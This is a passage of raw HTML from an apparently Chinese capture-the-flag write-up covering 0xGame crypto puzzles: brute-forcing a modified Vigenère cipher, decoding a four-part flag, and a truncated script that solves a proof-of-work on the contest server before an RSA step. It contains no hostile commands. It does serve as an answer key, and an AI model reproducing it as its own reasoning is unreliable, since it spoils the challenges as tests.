class=\"string\">f&quot;Alphabet长度: <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(alphabet)&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">70</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 验证加密函数</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">vigenere_encrypt</span>(<span class=\"params\">plaintext, key</span>):</span><br><span class=\"line\">    ciphertext = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    key_index = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> plaintext:</span><br><span class=\"line\">        bias = alphabet.index(key[key_index])</span><br><span class=\"line\">        char_index = alphabet.index(i)</span><br><span class=\"line\">        new_index = ((char_index + bias) * char_index) % <span class=\"built_in\">len</span>(alphabet)</span><br><span class=\"line\">        ciphertext += alphabet[new_index]</span><br><span class=\"line\">        key_index = (key_index + <span class=\"number\">1</span>) % <span class=\"built_in\">len</span>(key)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ciphertext</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 找出每个位置的所有可能解</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_all_solutions_per_position</span>(<span class=\"params\">ciphertext, key</span>):</span><br><span class=\"line\">    all_solutions = []</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> pos, cipher_char <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(ciphertext):</span><br><span class=\"line\">        key_index = pos % <span class=\"built_in\">len</span>(key)</span><br><span class=\"line\">        bias = alphabet.index(key[key_index])</span><br><span class=\"line\">        cipher_index = alphabet.index(cipher_char)</span><br><span class=\"line\">        </span><br><span class=\"line\">        solutions = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> char_index <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(alphabet)):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((char_index + bias) * char_index) % <span class=\"built_in\">len</span>(alphabet) == cipher_index:</span><br><span class=\"line\">                solutions.append(alphabet[char_index])</span><br><span class=\"line\">        </span><br><span class=\"line\">        all_solutions.append(solutions)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> all_solutions</span><br><span class=\"line\"></span><br><span class=\"line\">all_solutions = find_all_solutions_per_position(ciphertext, key)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示每个位置的可能解</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n每个位置的所有可能解:&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, (cipher_char, solutions) <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(<span class=\"built_in\">zip</span>(ciphertext, all_solutions)):</span><br><span class=\"line\">    key_char = key[i % <span class=\"built_in\">len</span>(key)]</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;位置<span class=\"subst\">&#123;i:2d&#125;</span> | 密文:&#x27;<span class=\"subst\">&#123;cipher_char&#125;</span>&#x27; key:&#x27;<span class=\"subst\">&#123;key_char&#125;</span>&#x27; | 解:<span class=\"subst\">&#123;solutions&#125;</span> (共<span class=\"subst\">&#123;<span class=\"built_in\">len</span>(solutions)&#125;</span>个)&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">70</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试搜索所有符合条件的flag</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;搜索符合 0xGame&#123;小写字母&#125; 格式的所有可能flag:\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">target_prefix = <span class=\"string\">&quot;0xGame&#123;&quot;</span></span><br><span class=\"line\">target_suffix = <span class=\"string\">&quot;&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查前缀和后缀是否可行</span></span><br><span class=\"line\">prefix_valid = <span class=\"built_in\">all</span>(target_prefix[i] <span class=\"keyword\">in</span> all_solutions[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(target_prefix)))</span><br><span class=\"line\">suffix_valid = target_suffix <span class=\"keyword\">in</span> all_solutions[-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> prefix_valid:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;❌ 无法构造 &#x27;0xGame&#123;&#x27; 前缀&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(target_prefix)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> target_prefix[i] <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> all_solutions[i]:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;   位置<span class=\"subst\">&#123;i&#125;</span>: 需要&#x27;<span class=\"subst\">&#123;target_prefix[i]&#125;</span>&#x27;, 但只有 <span class=\"subst\">&#123;all_solutions[i]&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">elif</span> <span class=\"keyword\">not</span> suffix_valid:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;❌ 无法构造 &#x27;&#125;&#125;&#x27; 后缀，位置<span class=\"subst\">&#123;<span class=\"built_in\">len</span>(ciphertext)-<span class=\"number\">1</span>&#125;</span>只有: <span class=\"subst\">&#123;all_solutions[-<span class=\"number\">1</span>]&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;✓ 前缀和后缀都可行\\n&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 中间部分的索引</span></span><br><span class=\"line\">    middle_start = <span class=\"built_in\">len</span>(target_prefix)</span><br><span class=\"line\">    middle_end = <span class=\"built_in\">len</span>(ciphertext) - <span class=\"number\">1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 获取中间每个位置的小写字母选项</span></span><br><span class=\"line\">    middle_options = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(middle_start, middle_end):</span><br><span class=\"line\">        lowercase_opts = [c <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> all_solutions[i] <span class=\"keyword\">if</span> c <span class=\"keyword\">in</span> ascii_lowercase]</span><br><span class=\"line\">        middle_options.append(lowercase_opts)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;位置<span class=\"subst\">&#123;i&#125;</span> 的小写字母选项: <span class=\"subst\">&#123;lowercase_opts&#125;</span>&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 检查是否所有中间位置都有小写字母选项</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">all</span>(<span class=\"built_in\">len</span>(opts) &gt; <span class=\"number\">0</span> <span class=\"keyword\">for</span> opts <span class=\"keyword\">in</span> middle_options):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n所有中间位置都有小写字母选项&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;总共有 <span class=\"subst\">&#123;<span class=\"built_in\">sum</span>(<span class=\"built_in\">len</span>(opts) <span class=\"keyword\">for</span> opts <span class=\"keyword\">in</span> middle_options)&#125;</span> 个可能的组合&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 如果组合数不太多，枚举所有可能</span></span><br><span class=\"line\">        total_combinations = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> opts <span class=\"keyword\">in</span> middle_options:</span><br><span class=\"line\">            total_combinations *= <span class=\"built_in\">len</span>(opts)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;可能的flag数量: <span class=\"subst\">&#123;total_combinations&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> total_combinations &lt;= <span class=\"number\">1000</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n枚举所有可能的flag:\\n&quot;</span>)</span><br><span class=\"line\">            valid_flags = []</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">for</span> combo <span class=\"keyword\">in</span> product(*middle_options):</span><br><span class=\"line\">                middle = <span class=\"string\">&quot;&quot;</span>.join(combo)</span><br><span class=\"line\">                flag = target_prefix + middle + target_suffix</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 验证</span></span><br><span class=\"line\">                encrypted = vigenere_encrypt(flag, key)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> encrypted == ciphertext:</span><br><span class=\"line\">                    valid_flags.append(flag)</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;✓ 找到有效flag: <span class=\"subst\">&#123;flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> valid_flags:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;❌ 没有找到完全匹配的flag&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n找到 <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(valid_flags)&#125;</span> 个有效flag&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n组合数太多(<span class=\"subst\">&#123;total_combinations&#125;</span>)，显示第一个可能的flag:&quot;</span>)</span><br><span class=\"line\">            middle = <span class=\"string\">&quot;&quot;</span>.join(opts[<span class=\"number\">0</span>] <span class=\"keyword\">for</span> opts <span class=\"keyword\">in</span> middle_options)</span><br><span class=\"line\">            flag = target_prefix + middle + target_suffix</span><br><span class=\"line\">            encrypted = vigenere_encrypt(flag, key)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Flag: <span class=\"subst\">&#123;flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;验证: <span class=\"subst\">&#123;encrypted == ciphertext&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n❌ 某些中间位置没有小写字母选项&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"笙莲\"><a href=\"#笙莲\" class=\"headerlink\" title=\"笙莲\"></a>笙莲</h2><p>题目将一个 100 字节的 flag（原始 flag 内容 + 随机填充）分成了四个 25 字节的部分，并对每个部分使用了不同的加密方法。我们的任务是分别逆向这些加密过程，然后将四部分拼接回来，最后得到原始的 flag。</p>\n<p>给定的密文：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c0_b64 = <span class=\"string\">b&#x27;MHhHYW1le7u2063AtLW9MHhHYW1lMjAyNQ==&#x27;</span></span><br><span class=\"line\">c1_hex = <span class=\"string\">&#x27;a3accfd6d4dac4e3d2d1beadd1a7bbe143727970746fb5c4bb&#x27;</span></span><br><span class=\"line\">c2_awaqaq = <span class=\"string\">&#x27;wqwwwqqaawwwaaqawqwawwwwaaawwwawaqqwwwqaqwwqwaaqwaqqaaawqqqaqaqwaaawwwqaqaaaaqawaqqqwwqqwaqwqwwwawawqqwwqqawqwaqwwawwqwaqqaqwaw&#x27;</span></span><br><span class=\"line\">c3_int = <span class=\"number\">5787980659359196741038715872684190805073807486263453249083702093905274294594502252203577660251756609738877887210677202141957646934092054500618364441642896304387589669635034683021946777034215355675802286923927161922717560413551789421376288823912349463080999424773600185557948875343480056576969695671340947861706467351885610345887785319870159654836532664189086047061137903149197973327299859185905186913896041309284477616128</span></span><br></pre></td></tr></table></figure>\n\n<p>Part1. Base64解密</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">flag0 = base64.b64decode(c0_b64)</span><br></pre></td></tr></table></figure>\n\n<p>Part2.十六进制转字节</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag1 = <span class=\"built_in\">bytes</span>.fromhex(c1_hex)</span><br></pre></td></tr></table></figure>\n\n<p>Part3. 替换加密, ‘a’ 代表 0，’w’ 代表 1，’q’ 代表 2</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reverse_awaqaq</span>(<span class=\"params\">s: <span class=\"built_in\">str</span></span>) -&gt; <span class=\"built_in\">bytes</span>:</span><br><span class=\"line\">    mapper = &#123;<span class=\"string\">&#x27;a&#x27;</span>: <span class=\"number\">0</span>, <span class=\"string\">&#x27;w&#x27;</span>: <span class=\"number\">1</span>, <span class=\"string\">&#x27;q&#x27;</span>: <span class=\"number\">2</span>&#125;</span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    power = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        num += mapper[char] * power</span><br><span class=\"line\">        power *= <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"comment\"># 原始脚本中 int.from_bytes 默认使用大端序 (big-endian)</span></span><br><span class=\"line\">    <span class=\"comment\"># 长度为 25 字节</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> num.to_bytes(<span class=\"number\">25</span>, <span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">flag2 = reverse_awaqaq(c2_awaqaq)</span><br></pre></td></tr></table></figure>\n\n<p>Part4. 7次方并用小端序表示的数，开7次方根</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">integer_nth_root</span>(<span class=\"params\">n, r</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;计算 n 的 r 次整数根&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> n &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> n == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">    low, high = <span class=\"number\">1</span>, n</span><br><span class=\"line\">    root = <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span>:  <span class=\"comment\"># 避免 mid 为 0</span></span><br><span class=\"line\">            low = <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            val = mid**r</span><br><span class=\"line\">        <span class=\"keyword\">except</span> OverflowError:</span><br><span class=\"line\">            val = <span class=\"built_in\">float</span>(<span class=\"string\">&#x27;inf&#x27;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> val == n:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> mid</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> val &lt; n:</span><br><span class=\"line\">            low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            root = mid</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\">root = integer_nth_root(c3_int, <span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"comment\"># 题目指明了使用小端序 (little-endian)</span></span><br><span class=\"line\">flag3 = root.to_bytes(<span class=\"number\">25</span>, <span class=\"string\">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>最后拼接4个部分的flag，然后使用<code>gb2312</code>编码解码得到flag。</p>\n<h2 id=\"2FA\"><a href=\"#2FA\" class=\"headerlink\" title=\"2FA\"></a>2FA</h2><p>这道题的收获就是安装了一个好用的身份验证APP，<code>microsoft authenticator</code>，扫码验证登录了就行了。</p>\n<h2 id=\"芸翎\"><a href=\"#芸翎\" class=\"headerlink\" title=\"芸翎\"></a>芸翎</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> product</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- 配置 ---</span></span><br><span class=\"line\">HOST = <span class=\"string\">&#x27;nc1.ctfplus.cn&#x27;</span></span><br><span class=\"line\">PORT = <span class=\"number\">12494</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- PoW 解决函数 ---</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve_pow</span>(<span class=\"params\">suffix: <span class=\"built_in\">str</span>, target_hash: <span class=\"built_in\">str</span></span>) -&gt; <span class=\"built_in\">str</span>:</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    通过暴力破解来解决 SHA-256 工作量证明挑战。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] 目标: sha256(XXXX + <span class=\"subst\">&#123;suffix&#125;</span>) == <span class=\"subst\">&#123;target_hash&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 开始暴力破解 PoW...&quot;</span>)</span><br><span class=\"line\">    start_time = time.time()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 字符集：大小写字母 + 数字</span></span><br><span class=\"line\">    charset = string.ascii_letters + string.digits</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 遍历所有长度为 4 的组合</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, prefix_tuple <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(product(charset, repeat=<span class=\"number\">4</span>)):</span><br><span class=\"line\">        prefix = <span class=\"string\">&quot;&quot;</span>.join(prefix_tuple)</span><br><span class=\"line\">        test_string = prefix + suffix</span><br><span class=\"line\">        calculated_hash = hashlib.sha256(test_string.encode()).hexdigest()</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> calculated_hash == target_hash:</span><br><span class=\"line\">            end_time = time.time()</span><br><span class=\"line\">            duration = end_time - start_time</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] PoW 解决！ 前缀: <span class=\"subst\">&#123;prefix&#125;</span> (耗时: <span class=\"subst\">&#123;duration:<span class=\"number\">.2</span>f&#125;</span>s)&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> prefix</span><br><span class=\"line\">            </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] PoW 破解失败！&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- 主逻辑 ---</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 1. 建立连接</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class=\"keyword\">as</span> s:</span><br><span class=\"line\">            s.connect((HOST, PORT))</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 已连接到 <span class=\"subst\">&#123;HOST&#125;</span>:<span class=\"subst\">&#123;PORT&#125;</span>&quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 2. 接收并解决 PoW</span></span><br><span class=\"line\">            initial_data = s.recv(<span class=\"number\">1024</span>).decode()</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(initial_data)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 使用正则表达式解析 PoW 挑战</span></span><br><span class=\"line\">            pow_match = re.search(<span class=\"string\">r&#x27;sha256\\(XXXX\\+(.*?)\\) == ([\\da-f]&#123;64&#125;)&#x27;</span>, initial_data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> pow_match:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 无法解析 PoW 挑战。&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            suffix, target = pow_match.groups()</span><br><span class=\"line\">            solution = solve_pow(suffix, target)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> solution:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 发送解决方案</span></span><br><span class=\"line\">            s.sendall((solution + <span class=\"string\">&#x27;\\n&#x27;</span>).encode())</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 3. 接收 RSA 参数并解密</span></span><br><span class=\"line\">            <span class=\"comment\"># 增大缓冲区以确保接收所有数据</span></span><br><span class=\"line\">            response_data = s.recv(<span class=\"number\">4096</span>).decode()</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(response_data)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 使用正则表达式解析 n, e, c</span></span><br><span class=\"line\">            n_match = re.search(<span class=\"string\">r&#x27;n = (\\d+)&#x27;</span>, response_data)</span><br><span class=\"line\">            e_match = re.search(<span class=\"string\">r&#x27;e = (\\d+)&#x27;</span>, response_data)</span><br><span class=\"line\">            c_match = re.search(<span class=\"string\">r&#x27;c = ([\\da-f]+)&#x27;</span>, response_data)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (n_match <span class=\"keyword\">and</span> e_match <span class=\"keyword\">and</span> c_match):</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 无法解析 RSA 参数。&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">            n = <span class=\"built_in\">int</span>(n_match.group(<span class=\"number\">1</span>))</span><br><span class=\"line\">            e = <span class=\"built_in\">int</span>(e_match.group(<span class=\"number\">1</span>))</span><br><span class=\"line\">            c_hex = c_match.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] 开始 RSA 解密...&quot;</span>)</span><br><span class=\"line\">            <span 